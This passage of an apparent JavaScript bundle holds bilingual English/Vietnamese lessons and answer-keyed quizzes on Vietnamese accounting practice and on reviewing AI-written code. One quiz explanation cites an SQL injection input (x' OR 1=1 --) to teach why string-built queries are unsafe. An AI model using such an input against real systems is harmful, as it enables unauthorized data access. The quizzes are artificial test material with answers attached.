VI: Sửa số lượng rồi gửi lại file PDF`,`Refuse; issue an adjustment or replacement
VI: Từ chối; lập hóa đơn điều chỉnh hoặc thay thế`,`Delete it and reissue with the same number
VI: Xóa đi rồi phát hành lại với cùng số`,`Fix it and add a note in the description
VI: Sửa rồi thêm ghi chú vào phần mô tả`],answer:1,why:`The buyer and the tax system already have the original. Only a new, linked invoice can correct it legally.
VI: Người mua và hệ thống thuế đã có hóa đơn gốc. Chỉ hóa đơn mới có tham chiếu mới sửa sai hợp lệ.`},{id:"accounting.vat-einvoice.3",kind:"compare",difficulty:"medium",prompt:`Where should the VAT rate be stored?
VI: Thuế suất GTGT nên lưu ở đâu?`,choices:["Only on the invoice header","On each invoice line","In one global setting","On the customer record"],answer:1,why:`One invoice can mix items with different rates, and rates can change over time. A global setting read later would rewrite history.
VI: Một hóa đơn có thể gồm hàng có thuế suất khác nhau, và thuế suất có thể thay đổi. Đọc cấu hình chung về sau sẽ làm sai dữ liệu cũ.`},{id:"accounting.vat-einvoice.4",kind:"debug",difficulty:"hard",prompt:"A VAT report recalculates `qty * unitPrice * rate` for old invoices. Its total does not match the tax return. Most likely cause?\nVI: Báo cáo VAT tính lại `qty * unitPrice * rate` cho hóa đơn cũ. Tổng không khớp tờ khai thuế. Nguyên nhân nhiều khả năng nhất?",choices:[`The tax return rounds to thousands of VND
VI: Tờ khai làm tròn đến nghìn đồng`,`It does not read the VAT stored on invoices
VI: Nó không đọc tiền thuế đã lưu trên hóa đơn`,`Old invoices were issued by another user
VI: Hóa đơn cũ do người dùng khác lập`,`The query should use LEFT JOIN instead
VI: Câu truy vấn nên dùng LEFT JOIN`],answer:1,why:`Rates and rounding may have changed since then. The VAT amount on the legal invoice is the truth, so report from the stored value.
VI: Thuế suất và cách làm tròn có thể đã đổi. Tiền thuế trên hóa đơn pháp lý mới là số đúng, nên báo cáo phải lấy số đã lưu.`}]},{id:"accounting.closing-reconciliation",title:"Period closing and reconciliation · Khóa sổ và đối chiếu",summary:`Check, match, then lock the month.
VI: Kiểm tra, đối chiếu, rồi khóa sổ tháng.`,minutes:5,blocks:[{type:"text",text:`At month end, accountants **close the period** (khóa sổ). They check and match the numbers, then lock the month. After that, nobody posts into it.
VI: Cuối tháng, kế toán khóa sổ. Họ kiểm tra và đối chiếu số liệu, rồi khóa tháng đó. Sau đó không ai được ghi sổ vào tháng đã khóa.`},{type:"diagram",text:`Month-end close (khóa sổ cuối tháng)

1 Post all documents (sales, buys, stock)
        ▼
2 Accruals and allocations (335, 242)
        ▼
3 Reconcile: bank, 131, 331, stock
        ▼
4 Offset VAT, revalue foreign currency
        ▼
5 Move revenue and costs to 911
        ▼
6 Reports, review, then LOCK`},{type:"text",text:`**Reconciliation** (đối chiếu) compares two records of the same thing. They must match, or each difference must have a reason.
VI: Đối chiếu là so sánh hai nguồn ghi chép của cùng một thứ. Chúng phải khớp, hoặc mỗi chênh lệch phải có lý do.`},{type:"diagram",text:`Bank reconciliation, 31/03

Bank statement balance        505m
Books, account 112            500m
                              ────
Difference                      5m

Reasons found:
+ 7m customer paid, not recorded
− 2m bank fee, not recorded
= 5m  all explained → post both`},{type:"text",text:`The **general ledger** (sổ cái) has one total for 131. The **sub-ledger** (sổ chi tiết công nợ) has one balance per customer. The customer balances must add up to the 131 total.
VI: Sổ cái có một số tổng cho 131. Sổ chi tiết công nợ có số dư cho từng khách. Tổng số dư các khách phải bằng số tổng của 131.`},{type:"code",code:{lang:"sql",text:`-- GL 131 vs lines with no customer
SELECT
  SUM(Debit - Credit) AS Gl131,
  SUM(CASE WHEN PartnerId IS NULL
      THEN Debit - Credit END) AS NoPartner
FROM JournalLine
WHERE AccountCode LIKE '131%'
  AND EntryDate <= '2026-03-31';
-- NoPartner must be NULL or 0`}},{type:"text",text:`In a **locked period**, the system rejects any entry dated inside it. A fix goes into the open month as a new **adjusting entry** (bút toán điều chỉnh).
VI: Với kỳ đã khóa, hệ thống từ chối mọi bút toán có ngày trong kỳ đó. Sai sót được sửa bằng bút toán điều chỉnh ở tháng đang mở.`},{type:"example",title:'Why "just UPDATE it" is forbidden',text:`The March reports already went to the tax office and the bank. A direct UPDATE changes March silently. Reports printed before and after now disagree. No audit trail shows who changed what, and debit may no longer equal credit.
VI: Báo cáo tháng 3 đã nộp cơ quan thuế và gửi ngân hàng. UPDATE trực tiếp sẽ âm thầm thay đổi tháng 3. Báo cáo in trước và sau không còn khớp. Không có vết ai sửa gì, và Nợ có thể không còn bằng Có.`},{type:"list",items:[`Who may reopen a locked period, and is it logged?
VI: Ai được mở lại kỳ đã khóa, và có ghi log không?`,`Lock per module (sales, stock) or the whole company at once?
VI: Khóa theo từng phân hệ (bán hàng, kho) hay cả công ty một lần?`,`Which date decides the period: document date or posting date?
VI: Ngày nào quyết định kỳ: ngày chứng từ hay ngày hạch toán?`]}],remember:`Closed means closed. Fix mistakes with a new entry in the open period.
VI: Đã khóa là khóa. Sửa sai bằng bút toán mới trong kỳ đang mở.`,questions:[{id:"accounting.closing-reconciliation.1",kind:"scenario",difficulty:"easy",prompt:`It is April. A user finds a wrong expense in February, which is locked. What is the right fix?
VI: Bây giờ là tháng 4. Người dùng phát hiện một khoản chi phí sai trong tháng 2, tháng đã khóa. Cách sửa đúng là gì?`,choices:[`UPDATE the February row in the database
VI: UPDATE dòng của tháng 2 trong database`,`Unlock February for everyone for a day
VI: Mở khóa tháng 2 cho mọi người một ngày`,`Post an adjusting entry in April
VI: Ghi bút toán điều chỉnh vào tháng 4`,`Delete the entry and post it again
VI: Xóa bút toán rồi ghi lại`],answer:2,why:`February reports are final. The correction goes into the open period, where everyone can see it.
VI: Báo cáo tháng 2 đã chốt. Bút toán sửa sai ghi vào kỳ đang mở, nơi mọi người đều thấy.`},{id:"accounting.closing-reconciliation.2",kind:"debug",difficulty:"medium",prompt:`The customer balances in the 131 sub-ledger add up to 80m. The general ledger shows 131 = 95m. Most likely cause?
VI: Tổng số dư các khách trên sổ chi tiết 131 là 80 triệu. Sổ cái 131 là 95 triệu. Nguyên nhân nhiều khả năng nhất?`,choices:[`A customer paid 15m by bank this week
VI: Một khách chuyển khoản 15 triệu tuần này`,`The sub-ledger hides zero balances
VI: Sổ chi tiết ẩn khách có số dư 0`,`A manual entry put 15m on 131, no customer
VI: Bút toán thủ công ghi 15 triệu vào 131, không có khách`,`The ledger report uses a newer layout
VI: Báo cáo sổ cái dùng mẫu mới hơn`],answer:2,why:`A line without a partner counts in the 131 total but in no customer balance. A payment would reduce both sides equally.
VI: Dòng không có đối tượng vẫn cộng vào tổng 131 nhưng không thuộc khách nào. Một khoản thu sẽ làm giảm cả hai bên như nhau.`},{id:"accounting.closing-reconciliation.3",kind:"mcq",difficulty:"medium",prompt:`Bank statement: 300m. Books (112): 302m. The bank charged a 2m fee you have not recorded. What is next?
VI: Sổ phụ ngân hàng: 300 triệu. Sổ sách (112): 302 triệu. Ngân hàng thu phí 2 triệu mà mình chưa ghi. Bước tiếp theo là gì?`,choices:["Record the 2m bank fee as an expense","Set 112 to 300m directly in the DB","Ask the bank to refund the 2m fee","Ignore it; 2m is too small to matter"],answer:0,why:`The fee is real and missing from the books. Post it, and 112 then matches the bank.
VI: Phí là có thật và sổ sách đang thiếu. Ghi nhận khoản phí, khi đó 112 sẽ khớp với ngân hàng.`},{id:"accounting.closing-reconciliation.4",kind:"code",difficulty:"hard",prompt:"March is closed, so `lockedUntil` is 2026-03-31. What happens to an entry dated 31 March?\nVI: Tháng 3 đã khóa, nên `lockedUntil` là 2026-03-31. Bút toán ngày 31/3 sẽ ra sao?",code:{lang:"csharp",text:`void Post(JournalEntry e, DateOnly lockedUntil)
{
    if (e.EntryDate < lockedUntil)
        throw new PeriodLockedException();
    Save(e);
}`},choices:["It is rejected, as it should be","It is saved; the check needs <=","It moves to April automatically","It throws: DateOnly cannot compare"],answer:1,why:"31 March is not less than 31 March, so the check passes. The last day of a closed month is still open. Use `<=`.\nVI: 31/3 không nhỏ hơn 31/3 nên điều kiện không chặn. Ngày cuối của tháng đã khóa vẫn bị ghi vào. Hãy dùng `<=`."}]},{id:"accounting.currency-rounding",title:"Currency and rounding · Ngoại tệ và làm tròn",summary:`Exchange rates, VND without decimals, and the one-đồng difference.
VI: Tỷ giá, VND không có số lẻ, và khoản chênh lệch một đồng.`,minutes:5,blocks:[{type:"text",text:`A sale in USD is recorded in VND at the **exchange rate** (tỷ giá) of the transaction date. Keep the foreign amount, the rate and the VND amount on the line.
VI: Giao dịch bằng USD được ghi sổ bằng VND theo tỷ giá ngày giao dịch. Lưu cả số ngoại tệ, tỷ giá và số VND trên dòng bút toán.`},{type:"diagram",text:`Example rates only

01/03 invoice 1,000 USD, rate 25,000
  Debit 131   25,000,000
  Credit 511  25,000,000

20/03 paid 1,000 USD, rate 25,300
  Debit 112   25,300,000
  Credit 131  25,000,000
  Credit 515     300,000  FX gain`},{type:"text",text:`The invoice entry never changes. The rate difference on payment is a **foreign exchange (FX) gain** (515) or **loss** (635). At period end, open USD balances are **revalued** at the period-end rate.
VI: Bút toán hóa đơn không bao giờ sửa. Chênh lệch tỷ giá khi thanh toán là lãi (515) hoặc lỗ (635). Cuối kỳ, số dư ngoại tệ còn lại được đánh giá lại theo tỷ giá cuối kỳ.`},{type:"text",text:`In practice VND has no decimals. Amounts are whole đồng. But 10% of 1,005 is 100.5, so you must round. Where you round changes the total.
VI: Trên thực tế VND không có số lẻ. Số tiền là đồng chẵn. Nhưng 10% của 1.005 là 100,5, nên phải làm tròn. Làm tròn ở bước nào sẽ làm tổng khác nhau.`},{type:"diagram",text:`3 lines, each 1,005 VND, VAT 10%

Round each line:
  100.5 → 101,  101 × 3 = 303

Round the total:
  3,015 × 10% = 301.5 → 302

Difference: 1 đồng`},{type:"code",code:{lang:"csharp",text:`decimal vat = 100.5m;
Math.Round(vat);   // 100 (default: to even!)
Math.Round(vat, 0,
  MidpointRounding.AwayFromZero); // 101`}},{type:"compare",left:{title:"decimal ✅",items:["C# `decimal`, SQL `DECIMAL(19,2)`\nVI: C# `decimal`, SQL `DECIMAL(19,2)`",`0.1 is stored exactly
VI: 0.1 được lưu chính xác`,`Totals match the accountant
VI: Tổng khớp với kế toán`]},right:{title:"float / double ⚠️",items:[`0.1 is not exact in binary
VI: 0.1 không chính xác ở dạng nhị phân`,"`0.1 + 0.2` gives 0.30000000000000004\nVI: `0.1 + 0.2` ra 0.30000000000000004","TS `number` is a float: keep whole đồng\nVI: `number` trong TS là float: lưu số đồng chẵn"]}},{type:"example",title:"The 1-đồng complaint",text:`Our screen rounds VAT per line. The e-invoice provider rounds on the total. The buyer sees two numbers that differ by 1 đồng and rejects the invoice. Pick one rule and use it everywhere.
VI: Màn hình của mình làm tròn VAT theo từng dòng. Nhà cung cấp hóa đơn điện tử làm tròn trên tổng. Bên mua thấy hai số lệch 1 đồng và từ chối hóa đơn. Hãy chọn một quy tắc và dùng ở mọi nơi.`}],remember:`Money is decimal, never float. Round by one agreed rule, in one place.
VI: Tiền dùng kiểu decimal, không bao giờ dùng float. Làm tròn theo một quy tắc đã thống nhất, ở một chỗ.`,questions:[{id:"accounting.currency-rounding.1",kind:"code",difficulty:"easy",prompt:`What does this TypeScript print?
VI: Đoạn TypeScript này in ra gì?`,code:{lang:"ts",text:`const total = 0.1 + 0.2;
console.log(total === 0.3);`},choices:["true","false","undefined","It throws an error"],answer:1,why:"`0.1 + 0.2` is 0.30000000000000004 in floating point. Never use float math for money.\nVI: Với số thực dấu phẩy động, `0.1 + 0.2` là 0.30000000000000004. Không dùng phép tính float cho tiền."},{id:"accounting.currency-rounding.2",kind:"code",difficulty:"hard",prompt:`What does this C# print?
VI: Đoạn C# này in ra gì?`,code:{lang:"csharp",text:`decimal vat = 1005m * 0.1m; // 100.5
Console.WriteLine(Math.Round(vat));`},choices:["101","100","100.5"],answer:1,why:"By default, `Math.Round` rounds a .5 to the nearest even number, so 100.5 becomes 100. Pass `MidpointRounding.AwayFromZero` to get 101.\nVI: Mặc định `Math.Round` làm tròn .5 về số chẵn gần nhất, nên 100.5 thành 100. Truyền `MidpointRounding.AwayFromZero` để được 101."},{id:"accounting.currency-rounding.3",kind:"scenario",difficulty:"medium",prompt:`A USD invoice was posted at rate 25,000. The customer pays later at 25,300. A developer wants to change the invoice rate to 25,300. What is right?
VI: Hóa đơn USD đã ghi theo tỷ giá 25.000. Khách trả sau với tỷ giá 25.300. Một dev muốn sửa tỷ giá hóa đơn thành 25.300. Cách nào đúng?`,choices:[`Change the invoice rate to match
VI: Sửa tỷ giá hóa đơn cho khớp`,`Post the payment at 25,000 too
VI: Ghi khoản thu cũng theo 25.000`,`Keep both; post the FX difference
VI: Giữ nguyên; ghi chênh lệch tỷ giá`,`Cancel and reissue at 25,300
VI: Hủy và lập lại theo 25.300`],answer:2,why:`Each event uses the rate of its own date. The difference is a real FX gain or loss, so it gets its own line.
VI: Mỗi nghiệp vụ dùng tỷ giá của ngày nó xảy ra. Chênh lệch là lãi hoặc lỗ tỷ giá thật, nên ghi thành dòng riêng.`},{id:"accounting.currency-rounding.4",kind:"debug",difficulty:"medium",prompt:`Sometimes our invoice total and the e-invoice total differ by 1 đồng. Most likely cause?
VI: Thỉnh thoảng tổng hóa đơn của mình và hóa đơn điện tử lệch 1 đồng. Nguyên nhân nhiều khả năng nhất?`,choices:[`The provider adds a 1 đồng fee
VI: Nhà cung cấp cộng phí 1 đồng`,`The two sides round at different steps
VI: Hai bên làm tròn ở bước khác nhau`,`The database stores VND as text
VI: Database lưu VND dạng chuỗi`,`The exchange rate changed that day
VI: Tỷ giá thay đổi trong ngày`],answer:1,why:`Rounding per line and rounding the total can differ by a few đồng. Agree on one rule and send the same numbers.
VI: Làm tròn từng dòng và làm tròn trên tổng có thể lệch vài đồng. Thống nhất một quy tắc và gửi đúng các con số đó.`},{id:"accounting.currency-rounding.5",kind:"truefalse",difficulty:"medium",prompt:"Storing money in a `float` column is fine, as long as you round when you show it.\nVI: Lưu tiền trong cột `float` vẫn ổn, miễn là làm tròn khi hiển thị.",choices:["True","False"],answer:1,why:`Small errors add up in sums before anything is shown. Equality checks like debit = credit can also fail.
VI: Sai số nhỏ cộng dồn trong các phép tổng trước khi hiển thị. Phép so sánh như Nợ = Có cũng có thể sai.`}]}],cheatSheet:[{title:"Core ideas · Ý chính",items:[{term:"Debit · Nợ",meaning:`Left side. Assets and expenses grow here.
VI: Bên trái. Tài sản và chi phí tăng bên này.`},{term:"Credit · Có",meaning:`Right side. Liabilities, equity and revenue grow here.
VI: Bên phải. Nợ phải trả, vốn và doanh thu tăng bên này.`},{term:"Double entry · Bút toán kép",meaning:`Every entry: total debit = total credit.
VI: Mọi bút toán: tổng Nợ = tổng Có.`},{term:"Accounting equation · Phương trình kế toán",meaning:`Assets = Liabilities + Equity.
VI: Tài sản = Nợ phải trả + Vốn chủ sở hữu.`},{term:"Accrual basis · Cơ sở dồn tích",meaning:`Revenue when earned, expense when incurred.
VI: Doanh thu khi thực hiện, chi phí khi phát sinh.`},{term:"Period close · Khóa sổ",meaning:`Check, reconcile, then lock the month.
VI: Kiểm tra, đối chiếu, rồi khóa tháng.`}]},{title:"Common accounts · Tài khoản thường gặp",items:[{term:"111 · Tiền mặt",meaning:`Cash on hand.
VI: Tiền mặt tại quỹ.`},{term:"112 · Tiền gửi ngân hàng",meaning:`Money in the bank.
VI: Tiền gửi ngân hàng.`},{term:"131 · Phải thu khách hàng",meaning:`What customers owe us.
VI: Tiền khách hàng còn nợ mình.`},{term:"331 · Phải trả người bán",meaning:`What we owe suppliers.
VI: Tiền mình còn nợ nhà cung cấp.`},{term:"156 · Hàng hóa",meaning:`Goods bought for resale.
VI: Hàng mua về để bán.`},{term:"511 · Doanh thu",meaning:`Revenue from sales and services.
VI: Doanh thu bán hàng và cung cấp dịch vụ.`},{term:"632 · Giá vốn hàng bán",meaning:`Cost of the goods we sold.
VI: Giá vốn của hàng đã bán.`},{term:"133 / 3331 · Thuế GTGT",meaning:`Input VAT (we can deduct) / output VAT (we must pay).
VI: Thuế GTGT đầu vào được khấu trừ / đầu ra phải nộp.`}]},{title:"Documents and debts · Chứng từ và công nợ",items:[{term:"E-invoice · Hóa đơn điện tử",meaning:`Legal invoice. Never edited after it is issued.
VI: Hóa đơn pháp lý. Không sửa sau khi phát hành.`},{term:"Adjustment invoice · Hóa đơn điều chỉnh",meaning:`Adds or reduces wrong amounts. The original stays valid.
VI: Tăng hoặc giảm phần sai. Hóa đơn gốc vẫn hiệu lực.`},{term:"Replacement invoice · Hóa đơn thay thế",meaning:`A full new invoice. The original is no longer valid.
VI: Hóa đơn mới đầy đủ. Hóa đơn gốc hết hiệu lực.`},{term:"VAT to pay · Thuế GTGT phải nộp",meaning:`Output VAT minus input VAT.
VI: Thuế đầu ra trừ thuế đầu vào.`},{term:"Allocation · Cấn trừ",meaning:`Matching a payment to the invoices it pays.
VI: Gắn khoản thanh toán với các hóa đơn được trả.`},{term:"Aging · Tuổi nợ",meaning:`Open amounts grouped by days past the due date.
VI: Số còn nợ nhóm theo số ngày quá hạn.`},{term:"Credit limit · Hạn mức công nợ",meaning:`The most a customer may owe.
VI: Số nợ tối đa một khách được phép.`}]},{title:"IT rules · Quy tắc cho IT",items:[{term:"Money type · Kiểu tiền",meaning:`Use decimal, never float or double.
VI: Dùng decimal, không dùng float hay double.`},{term:"Rounding · Làm tròn",meaning:`One agreed rule, set the midpoint mode on purpose.
VI: Một quy tắc thống nhất, chọn rõ cách làm tròn số .5.`},{term:"Posted entry · Bút toán đã ghi sổ",meaning:`Never edited. Reverse it or adjust it.
VI: Không sửa. Ghi bút toán đảo hoặc điều chỉnh.`},{term:"Locked period · Kỳ đã khóa",meaning:`Reject any entry dated inside it.
VI: Từ chối mọi bút toán có ngày trong kỳ đó.`},{term:"Leaf account · Tài khoản chi tiết",meaning:`Post only to accounts with no children.
VI: Chỉ ghi vào tài khoản không có tài khoản con.`},{term:"Partner field · Đối tượng",meaning:`Who the line is about; required on 131 and 331.
VI: Dòng này thuộc về ai; bắt buộc với 131 và 331.`},{term:"Reconcile · Đối chiếu",meaning:`Sub-ledger total must equal the general ledger.
VI: Tổng sổ chi tiết phải bằng sổ cái.`}]}]},o=Object.freeze(Object.defineProperty({__proto__:null,default:s},Symbol.toStringTag,{value:"Module"})),r={id:"ai",title:"AI for Developers",emoji:"🤖",tagline:"AI writes code. You own the result.",lessons:[{id:"ai.analyze-plan",title:"Analyze first, then plan",summary:"Do not jump straight to code — not even with AI.",minutes:4,blocks:[{type:"text",text:`**AI writes code. You own the result.**
The AI assistant is a fast helper that never gets tired. But it does not join the incident call at 2 AM — you do. Everything it writes must pass through your brain before it reaches production.`},{type:"diagram",text:`   Task
     ↓
1. Analyze → restate goal, unknowns, questions
     ↓
2. Plan    → steps, risks, test cases
     ↓
3. Build   → one small step at a time
     ↓
4. Review  → read every line of the diff
     ↓
5. Test    → run it, check what tests assert
     ↓
 You own the result ✅`},{type:"text",text:"Step 1 — **analyze**. Before any code, ask the AI to restate the goal, list what is unclear, and ask you questions. If its summary is wrong, you just saved an hour."},{type:"example",title:"Analyze prompt",text:`Task: "Add CSV export to the Orders page."
Before writing code:
1. Restate the goal in 2–3 sentences.
2. List unknowns and assumptions.
3. Ask me up to 5 clarifying questions.
Do not write code yet.

Typical questions the AI asks back: Which columns? Include cancelled orders? Max number of rows? Who is allowed to export?`},{type:"text",text:"Step 2 — **plan**. Ask for a step-by-step plan with **risks** and **test cases**. Then build one step at a time: write the code, review it, run tests, then go to the next step."},{type:"compare",left:{title:"Code-first prompt ⚠️",items:['"Write the export feature."',"The AI guesses the requirements","Big diff, hard to review","Wrong guesses show up in QA"]},right:{title:"Plan-first prompt ✅",items:['"Plan it: steps, risks, test cases. No code yet."',"Wrong guesses show up early, while they are cheap to fix","Small steps, small diffs","Test cases ready before the code"]}},{type:"text",text:'Some questions the AI asks are **business questions** ("Include cancelled orders?"). Neither you nor the AI should guess. Ask the person who owns the requirement.'}],remember:"AI writes code. You own the result. Analyze → plan → small steps.",questions:[{id:"ai.analyze-plan.1",kind:"scenario",difficulty:"easy",prompt:"A ticket asks for CSV export on the Orders page. You paste it into the AI assistant. It immediately writes 400 lines in 6 files. Which first prompt is better?",choices:["Ask for the same code, but with more comments for review","Ask it to put all the code in one file so it is easier to read","Ask it to restate the goal and list unknowns before any code","Ask it to generate two versions and keep the shorter one"],answer:2,why:"A short ticket hides many decisions: columns, filters, size limits, permissions. Ask the AI to restate the goal and ask questions first. Then you find wrong guesses before they become 400 lines of code."},{id:"ai.analyze-plan.2",kind:"scenario",difficulty:"medium",prompt:'While analyzing a refund feature, the AI asks: "Should refunds be allowed after 30 days?" The ticket does not say. What do you do?',choices:["Let the AI pick the rule most online shops use","Pick 30 days yourself — it sounds reasonable","Ask the product owner and write the answer in the ticket","Skip the check for now and let QA decide later"],answer:2,why:"This is a business rule. The AI cannot know your company policy, and a guess becomes a bug that looks like a feature. Confirm it with the person who owns the requirement.",remember:"Business rule unclear → ask a human, not the AI."},{id:"ai.analyze-plan.3",kind:"compare",difficulty:"medium",prompt:"You need a change that touches the API, the database schema and the UI. Which prompt is better to start with?",choices:['"Here is the ticket. Implement this change fully, in all three layers, with all the code."','"Here is the ticket. Give a step-by-step plan with risks and test cases. No code yet."'],answer:1,why:"A change across several layers needs a plan. The plan shows the order of work and the risky parts, like a schema migration. It also shows how to test each step. Reviewing a plan is much cheaper than reviewing a huge diff."},{id:"ai.analyze-plan.4",kind:"truefalse",difficulty:"easy",prompt:"If the AI assistant wrote the code and it breaks production, the responsibility belongs to the AI tool.",choices:["True","False"],answer:1,why:"The developer who commits the code owns it. The AI is a tool, like a compiler or a library — you decide what goes in.",remember:"AI writes code. You own the result."},{id:"ai.analyze-plan.5",kind:"scenario",difficulty:"hard",prompt:"The AI gives you a good 6-step plan. What is the best way to implement it?",choices:["One step at a time: generate, review, test, then the next","Ask for all 6 steps in one big answer to save some time","Build all 6 steps first, then write the tests at the very end","Skip review of the small steps and only review the final result"],answer:0,why:"Small steps keep each diff small enough to really read. If a test fails, you know exactly which step broke it."}]},{id:"ai.context",title:"Give the right context",summary:"Too little → generic answers. Too much → noise.",minutes:4,blocks:[{type:"text",text:"The AI only knows what you tell it, plus what it learned in training (which may be old). It does not see your logs, your team rules or the bug on your screen. You must give them to it."},{type:"diagram",text:`Too little       Just right         Too much
"fix the bug"    goal + error +     whole repo,
                 2–3 key files      10 log files
     ↓                ↓                  ↓
generic answer   specific answer    lost in noise`},{type:"list",items:["**Goal** — what should happen, and what happens instead.",'**Error** — the full message and stack trace, not "it crashes".',"**Relevant code** — the method, its callers, the related types. Not the whole repo.","**Versions** — .NET 8 or .NET Framework 4.8? React 18 or 19? The answers differ.",'**Constraints** — "no new packages", "SQL Server 2019", "must not change the public API".',"**What you already tried** — so it does not suggest the same thing again."]},{type:"compare",left:{title:"Bad prompt ⚠️",items:["(pastes a 2,000-line file)",'"Fix the bug."']},right:{title:"Good prompt ✅",items:['"`CalculateTotal` returns 90 for this cart; expected 100."','"The discount should apply once, not per item."','"Here is the method and the `Cart` type. .NET 8."','"I already checked rounding; it is not that."']}},{type:"text",text:"Never paste secrets: passwords, API keys, connection strings, customer personal data. Replace them with placeholders like `<PASSWORD>`."}],remember:"Give the goal, the error, the relevant code, versions and constraints — not everything.",questions:[{id:"ai.context.1",kind:"scenario",difficulty:"easy",prompt:'You paste a 2,000-line file and write "fix the bug". The answer is generic: "check for null values and add logging". Why?',choices:["AI assistants work much better with JavaScript than with C#","You should have asked in a more polite and friendly way","The AI needs the file split into many smaller files first","It has no symptom, no expected result and no error to work from"],answer:3,why:'The AI cannot guess which of 2,000 lines is "the bug". Describe the expected and the actual behavior, give the error, and point to the relevant part.',remember:"No symptom in the prompt → generic answer."},{id:"ai.context.2",kind:"scenario",difficulty:"medium",prompt:"The AI suggests code with `record struct` and file-scoped namespaces. Your project targets .NET Framework 4.8 with C# 7.3, so it does not compile. What context was missing from your prompt?",choices:["The target framework and C# language version","The coding style guide of your team","The list of NuGet packages already installed","The folder structure of the solution"],answer:0,why:"Both features need C# 10. Without a version, the AI often assumes a recent one. Always state your versions at the start.",remember:"Always say your versions."},{id:"ai.context.3",kind:"compare",difficulty:"medium",prompt:"You want help with a slow endpoint. Which prompt gives better results?",choices:['Paste the endpoint, the query it runs, the timings, and "SQL Server 2019, EF Core 8"','Paste all 180 files of the solution plus last week of logs, and ask "why is it slow?"'],answer:0,why:"If you paste everything, the important part gets lost in the noise. Focused context with real measurements leads the AI to the real problem."}]},{id:"ai.review",title:"Review AI code like a stranger's PR",summary:"Read every line. The AI is confident, not careful.",minutes:5,blocks:[{type:"text",text:"AI code **looks** clean: good names, nice formatting, helpful comments. That makes it easy to approve without really reading. Review it like a pull request from a new teammate you have never met."},{type:"list",items:["**Does it do what was asked?** Not more, not less.","**Edge cases** — null, empty list, zero, huge input, duplicates, time zones.","**Error handling** — are errors handled and logged, or silently ignored?","**Security** — SQL built from strings, missing auth checks, secrets in code, user input in HTML.","**Performance** — queries inside loops, loading whole tables, `.Result` on async calls.","**Fits the codebase** — same patterns, naming, logging and DI style as the rest of the project."]},{type:"code",code:{lang:"csharp",text:`// AI: "Here is a clean helper to get the user's age."
public static int GetAge(DateTime birthDate)
{
    return DateTime.Now.Year - birthDate.Year;
}
// Looks fine. Wrong for anyone whose birthday
// has not happened yet this year.`}},{type:"text",text:'**Diff size matters.** You asked for a one-line fix and got 300 changed lines? Stop. Ask what each change is for, or ask again with "change only X".'},{type:"example",title:"A common story",text:'A developer asked the AI to "add a field to the DTO". The diff also renamed two properties "for consistency". The mobile app used those JSON names and broke the next morning.'}],remember:"Read every line. If you cannot explain it, you cannot ship it.",questions:[{id:"ai.review.1",kind:"code",difficulty:"medium",prompt:"The AI wrote this EF Core query. What is the biggest problem?",code:{lang:"csharp",text:`var users = await db.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Email = '{email}'")
    .ToListAsync();`},choices:["SQL injection: user input goes straight into the SQL text","`ToListAsync` should be replaced with `ToList`","It should select only `Id` instead of `*`","Email comparison must always be case-sensitive"],answer:0,why:"C# builds the string before EF Core sees it. So input like `x' OR 1=1 --` changes the query. Use LINQ, or pass an interpolated string to `FromSql` / `FromSqlInterpolated`. Then the values become parameters.",remember:"User input in SQL text = injection."},{id:"ai.review.2",kind:"code",difficulty:"medium",prompt:"You review this AI-generated function. The API returns 404 for unknown users. What happens?",code:{lang:"ts",text:"export async function getUser(id: string): Promise<User> {\n  const res = await fetch(`/api/users/${id}`);\n  return await res.json();\n}"},choices:["`fetch` throws on 404, so the caller gets an exception","TypeScript blocks the bad response at compile time","The 404 error body is returned as if it were a `User`, or parsing fails","The browser retries the request a few times automatically"],answer:2,why:"`fetch` only fails (rejects) on network errors, not on HTTP 4xx/5xx. Check `res.ok` before parsing. The `Promise<User>` type checks nothing at runtime."},{id:"ai.review.3",kind:"code",difficulty:"hard",prompt:'The AI says: "This is simple and correct." Which input breaks it?',code:{lang:"csharp",text:`public static decimal AverageOrderValue(List<Order> orders)
{
    return orders.Sum(o => o.Total) / orders.Count;
}`},choices:["A list with exactly one order","An empty list","Orders with totals over 1,000,000","Orders with negative totals (refunds)"],answer:1,why:"With no orders, `orders.Count` is 0 and decimal division by zero throws `DivideByZeroException`. What to return then (0, null, an error?) is a requirement question.",remember:"Always ask: what about empty?"},{id:"ai.review.4",kind:"scenario",difficulty:"medium",prompt:'You asked the AI to fix a typo in an error message. The diff changes 280 lines in 9 files, including "small cleanups". What do you do?',choices:["Approve it — free cleanup in the same PR is a nice bonus","Approve it as long as the build and the linter both pass","Ask the AI if all the changes are safe and trust its answer","Ask for only the typo fix; do any cleanup as a separate change"],answer:3,why:"A huge diff for a tiny task is hard to review. It can hide behavior changes. Keep each change focused.",remember:"Small task → small diff."},{id:"ai.review.5",kind:"perf",difficulty:"medium",prompt:"This AI-generated code works in your test cart with 5 products. In production a cart can have 300 products. What will a careful review catch?",code:{lang:"csharp",text:`foreach (var id in productIds)
{
    var p = await db.Products.FirstAsync(x => x.Id == id);
    total += p.Price;
}`},choices:["One database query per product — an N+1 pattern","`FirstAsync` is not supported by EF Core","`foreach` should be a `for` loop for speed","Adding 300 decimals is slow"],answer:0,why:"Each loop step makes a separate call to the database (a round trip). With 300 products, that is 300 queries. This is the N+1 problem. Load all needed products in one query, for example `Where(p => productIds.Contains(p.Id))`."}]},{id:"ai.testing",title:"Test it — and test the tests",summary:"AI can write tests that pass on wrong code.",minutes:4,blocks:[{type:"text",text:"Step one is simple: **run the code**. Some AI answers do not compile. Others compile and do the wrong thing. Reading alone is not enough."},{type:"text",text:"The AI is fast at writing tests. But a test is only useful if it **fails when the code is wrong**. AI tests often pass no matter what."},{type:"code",code:{lang:"csharp",text:`var result = PriceService.ApplyDiscount(100m, 0.2m);

// ⚠️ Weak: passes for many wrong answers
Assert.True(result > 0);

// ✅ Strong: checks the exact business result
Assert.Equal(80m, result);`}},{type:"list",items:['Only checks "does not throw" or "is not null".',"Computes the expected value with the **same formula** as the code — a copied bug passes.","Mocks the same thing it should test.","Only the happy path (the normal case) — no empty, null, boundary or error cases.","The AI **changed an assertion** to make a failing test pass."]},{type:"example",title:"The 10-second check",text:"Break the code on purpose: change `0.2m` to `0.3m`, or `>` to `>=`. Run the tests. If they still pass, the tests are not protecting you."},{type:"text",text:'Take expected values **from the requirement**, not from the code. "100 with 20% off → 80" is a requirement. `price * (1 - rate)` is just the implementation again.'}],remember:"A test that cannot fail is not a test. Break the code and check that a test turns red.",questions:[{id:"ai.testing.1",kind:"code",difficulty:"easy",prompt:"The AI wrote this xUnit test. It passes. What is wrong with it?",code:{lang:"csharp",text:`[Fact]
